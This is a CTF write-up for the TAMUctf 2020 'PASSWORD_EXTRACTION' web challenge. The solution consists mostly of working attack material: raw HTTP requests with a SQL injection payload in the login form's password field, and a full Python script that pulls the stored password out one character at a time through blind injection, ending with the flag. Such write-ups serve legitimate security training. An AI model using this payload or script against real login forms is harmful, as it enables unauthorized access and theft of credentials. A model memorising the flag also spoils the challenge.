# TAMUctf 2020 – PASSWORD_EXTRACTION

* **Category:** web
* **Points:** 50

## Challenge

> The owner of this website often reuses passwords. Can you find out the password they are using on this test server?
> 
> http://passwordextraction.tamuctf.com
> 
> You do not need to use brute force for this challenge.

## Solution

The website contains only a login form that is vulnerable to SQL injection.

```
POST /login.php HTTP/1.1
Host: passwordextraction.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Origin: http://passwordextraction.tamuctf.com
Connection: close
Referer: http://passwordextraction.tamuctf.com/
Upgrade-Insecure-Requests: 1

username=foo&password=foo%27%20OR%201%3D1%20AND%20username%20LIKE%20%27a%25

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 18:00:47 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 72
Connection: close
Vary: Accept-Encoding

You've successfully authorized, but that doesn't get you the password.
```

Modifying the SQL injection query you will discover that the password is the flag.

```
POST /login.php HTTP/1.1
Host: passwordextraction.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://passwordextraction.tamuctf.com
Connection: close
Referer: http://passwordextraction.tamuctf.com/
Upgrade-Insecure-Requests: 1

username=foo&password=foo%27%20OR%201%3D1%20AND%20password%20LIKE%20%27gigem%7B%25

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Sat, 21 Mar 2020 18:02:51 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 72
Connection: close
Vary: Accept-Encoding

You've successfully authorized, but that doesn't get you the password.
```

You can write a [Python script](password-extraction-solver.py) to easily exfiltrate all password chars via blind SQL injection.

```python
import requests
import string
import time

url_form = "http://passwordextraction.tamuctf.com/login.php"
payload = "username=foo&password=foo' OR 1=1 AND password LIKE '{}%"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded",
   "Origin": "http://passwordextraction.tamuctf.com",
   "Referer": "http://passwordextraction.tamuctf.com/"
}

found_chars = "gigem{"
while True:
    for new_char in string.printable.replace("%", "").replace("_", ""):
        attempt = found_chars + new_char
        print("[*] Attempt: '{}'.".format(attempt))
        data = payload.format(attempt)
        print("[*] Payload: {}.".format(data))
        
        page = None
        response_ok = False
        while not response_ok:
            try:
                page = requests.post(url_form, data=data, headers=headers)
                response_ok = True
            except:
                print("[!] EXCEPTION!")
                time.sleep(1 * 60)
    
        if "successfully authorized" in page.text:
            found_chars += new_char
            print("[*] Found chars: '{}'".format(found_chars))
            break
    
    if found_chars[-1] == "}":
        break
        
print("The FLAG is: {}".format(found_chars))
```

The flag is the following.

```
gigem{h0peYouScr1ptedTh1s}
```